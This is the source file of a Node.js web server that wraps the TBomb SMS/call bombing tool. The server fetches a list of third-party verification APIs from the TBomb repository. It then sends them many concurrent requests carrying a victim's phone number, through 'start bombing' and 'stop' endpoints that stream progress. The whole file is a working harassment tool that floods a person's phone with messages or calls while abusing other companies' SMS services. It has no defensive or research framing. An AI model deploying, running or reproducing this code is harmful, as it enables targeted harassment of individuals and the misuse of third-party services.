const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Store active jobs
const activeJobs = new Map();
let jobCounter = 0;

// ============================================================================
// API PROVIDER - Using Original APIs Only
// ============================================================================

class APIProvider {
    constructor(cc, target, mode, delay = 0) {
        this.cc = cc;
        this.target = target;
        this.mode = mode.toLowerCase();
        this.delay = delay;
        this.apiProviders = [];
        this.index = 0;
        this.status = true;
        this.apiVersion = "2.3.5";
        this.lockPromise = Promise.resolve();
    }

    async _loadProvidersFromOriginal() {
        try {
            let PROVIDERS;
            const localPath = path.join(__dirname, 'apidata.json');
            
            if (fs.existsSync(localPath)) {
                PROVIDERS = JSON.parse(fs.readFileSync(localPath, 'utf8'));
            } else {
                const response = await axios.get(
                    'https://github.com/TheSpeedX/TBomb/raw/master/apidata.json',
                    { timeout: 10000 }
                );
                PROVIDERS = response.data;
                fs.writeFileSync(localPath, JSON.stringify(PROVIDERS, null, 2));
            }
            
            this.apiVersion = PROVIDERS.version || "2.3.5";
            const providers = PROVIDERS[this.mode] || {};
            
            // Get country-specific APIs
            this.apiProviders = providers[this.cc] || [];
            
            // Add multi-country APIs as fallback
            if (this.apiProviders.length < 10) {
                const multiProviders = providers.multi || [];
                this.apiProviders.push(...multiProviders);
            }
            
        } catch (error) {
            console.error('Error loading APIs:', error.message);
            this.apiProviders = [];
        }
    }

    _formatConfig(config) {
        const configStr = JSON.stringify(config);
        const formatted = configStr
            .replace(/{target}/g, this.target)
            .replace(/{cc}/g, this.cc);
        return JSON.parse(formatted);
    }

    async _selectApi() {
        if (!this.apiProviders.length || !this.status) {
            return null;
        }
        
        this.index = (this.index + 1) % this.apiProviders.length;
        const config = { ...this.apiProviders[this.index] };
        
        // Add default headers
        const permaHeaders = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
        };
        
        if (config.headers) {
            config.headers = { ...config.headers, ...permaHeaders };
        } else {
            config.headers = permaHeaders;
        }
        
        return this._formatConfig(config);
    }

    _removeCurrentApi() {
        if (this.index < this.apiProviders.length) {
            this.apiProviders.splice(this.index, 1);
            return true;
        }
        return false;
    }

    async _makeRequest(config) {
        try {
            const method = (config.method || 'GET').toUpperCase();
            const url = config.url;
            const timeout = config.timeout || 30000;
            const identifier = (config.identifier || '').toLowerCase();
            
            // Remove metadata fields
            delete config.name;
            delete config.cc_target;
            delete config.method;
            delete config.url;
            delete config.timeout;
            delete config.identifier;
            
            const requestConfig = {
                method: method,
                url: url,
                timeout: timeout,
                headers: config.headers || {},
                validateStatus: () => true // Don't throw on any status
            };
            
            if (config.data) requestConfig.data = config.data;
            if (config.json) requestConfig.data = config.json;
            if (config.params) requestConfig.params = config.params;
            if (config.cookies) requestConfig.headers.Cookie = config.cookies;
            
            const response = await axios(requestConfig);
            
            // Check response for identifier
            if (identifier) {
                return response.data && response.data.toString().toLowerCase().includes(identifier);
            }
            return response.status < 500; // Consider 4xx as success for bombing
            
        } catch (error) {
            return false;
        }
    }

    async hit() {
        if (!this.status) return null;
        
        await new Promise(resolve => setTimeout(resolve, this.delay * 1000));
        
        const config = await this._selectApi();
        if (!config || this.index === -1) return null;
        
        const result = await this._makeRequest(config);
        
        if (result === false) {
            this._removeCurrentApi();
        } else if (result === null) {
            this.status = false;
        }
        
        return result;
    }
    
    get availableApis() {
        return this.apiProviders.length;
    }
}

// ============================================================================
// BOMBING WORKER
// ============================================================================

class BombingJob {
    constructor(jobId, mode, cc, target, count, delay, threads, onProgress, onLog, onComplete) {
        this.jobId = jobId;
        this.mode = mode;
        this.cc = cc;
        this.target = target;
        this.count = count;
        this.delay = delay;
        this.threads = threads;
        this.onProgress = onProgress;
        this.onLog = onLog;
        this.onComplete = onComplete;
        this.active = true;
        this.success = 0;
        this.failed = 0;
    }
    
    async run() {
        const api = new APIProvider(this.cc, this.target, this.mode, this.delay);
        await api._loadProvidersFromOriginal();
        
        if (api.availableApis === 0) {
            this.onLog(`No APIs available for country code ${this.cc} in ${this.mode} mode`, 'error');
            this.onComplete(this.success, this.failed);
            return;
        }
        
        this.onLog(`Loaded ${api.availableApis} API providers from original apidata.json`, 'success');
        
        // Run requests with concurrency control
        const pendingRequests = [];
        let completed = 0;
        
        for (let i = 0; i < this.count && this.active; i++) {
            if (pendingRequests.length >= this.threads) {
                // Wait for one request to complete
                const result = await Promise.race(pendingRequests);
                const index = pendingRequests.indexOf(result);
                if (index > -1) pendingRequests.splice(index, 1);
                
                if (result.result === true) {
                    this.success++;
                } else if (result.result === false) {
                    this.failed++;
                }
                completed++;
                
                this.onProgress(this.success, this.failed, this.count);
            }
            
            // Start new request
            const requestPromise = api.hit().then(result => ({ result }));
            pendingRequests.push(requestPromise);
            
            // Small delay between starting requests
            await new Promise(resolve => setTimeout(resolve, 50));
        }
        
        // Wait for remaining requests
        while (pendingRequests.length > 0 && this.active) {
            const result = await Promise.race(pendingRequests);
            const index = pendingRequests.indexOf(result);
            if (index > -1) pendingRequests.splice(index, 1);
            
            if (result.result === true) {
                this.success++;
            } else if (result.result === false) {
                this.failed++;
            }
            completed++;
            
            this.onProgress(this.success, this.failed, this.count);
        }
        
        this.onLog(`Testing completed! Success: ${this.success}, Failed: ${this.failed}`, 'success');
        this.onComplete(this.success, this.failed);
    }
    
    stop() {
        this.active = false;
    }
}

// ============================================================================
// EXPRESS ROUTES
// ============================================================================

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Get country codes
app.get('/api/countries', async (req, res) => {
    try {
        const localPath = path.join(__dirname, 'isdcodes.json');
        let countries = {};
        
        if (fs.existsSync(localPath)) {
            const data = JSON.parse(fs.readFileSync(localPath, 'utf8'));
            countries = data.isdcodes || {};
        } else {
            const response = await axios.get(
                'https://github.com/TheSpeedX/TBomb/raw/master/isdcodes.json',
                { timeout: 10000 }
            );
            countries = response.data.isdcodes || {};
            fs.writeFileSync(localPath, JSON.stringify(response.data, null, 2));
        }
        
        res.json(countries);
    } catch (error) {
        // Return fallback codes
        res.json({
            "91": "India",
            "1": "USA",
            "44": "UK",
            "61": "Australia",
            "977": "Nepal",
            "218": "Libya",
            "86": "China",
            "81": "Japan"
        });
    }
});

// Start bombing
app.post('/api/start', (req, res) => {
    const { mode, cc, target, count, delay, threads } = req.body;
    
    if (!mode || !cc || !target || !count) {
        return res.status(400).json({ error: 'Missing required parameters' });
    }
    
    const jobId = (++jobCounter).toString();
    
    // Store SSE response objects for this job
    const clients = [];
    
    const onProgress = (success, failed, total) => {
        clients.forEach(client => {
            client.write(`data: ${JSON.stringify({ type: 'progress', success, failed, targetCount: total })}\n\n`);
        });
    };
    
    const onLog = (message, level) => {
        clients.forEach(client => {
            client.write(`data: ${JSON.stringify({ type: 'log', message, level })}\n\n`);
        });
    };
    
    const onComplete = (success, failed) => {
        clients.forEach(client => {
            client.write(`data: ${JSON.stringify({ type: 'complete', success, failed })}\n\n`);
            client.end();
        });
        activeJobs.delete(jobId);
    };
    
    const job = new BombingJob(jobId, mode, cc, target, count, delay, threads, onProgress, onLog, onComplete);
    activeJobs.set(jobId, { job, clients });
    
    // Start job asynchronously
    setTimeout(() => job.run(), 100);
    
    res.json({ jobId });
});

// SSE endpoint for realtime updates
app.get('/api/events/:jobId', (req, res) => {
    const { jobId } = req.params;
    const jobData = activeJobs.get(jobId);
    
    if (!jobData) {
        res.status(404).json({ error: 'Job not found' });
        return;
    }
    
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });
    
    jobData.clients.push(res);
    
    req.on('close', () => {
        const index = jobData.clients.indexOf(res);
        if (index > -1) {
            jobData.clients.splice(index, 1);
        }
    });
});

// Stop bombing
app.post('/api/stop', (req, res) => {
    const { jobId } = req.body;
    const jobData = activeJobs.get(jobId);
    
    if (jobData) {
        jobData.job.stop();
        // Close all client connections
        jobData.clients.forEach(client => {
            client.write(`data: ${JSON.stringify({ type: 'log', message: 'Stopping job...', level: 'warning' })}\n\n`);
            client.end();
        });
        activeJobs.delete(jobId);
    }
    
    res.json({ success: true });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', version: '2.3.5' });
});

// Start server
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log('TBomb Web Server - Using Original APIs from apidata.json');
    console.log(`Server running on http://localhost:${PORT}`);
    console.log('No new APIs have been added - Using original TBomb APIs only');
    console.log('='.repeat(50));
});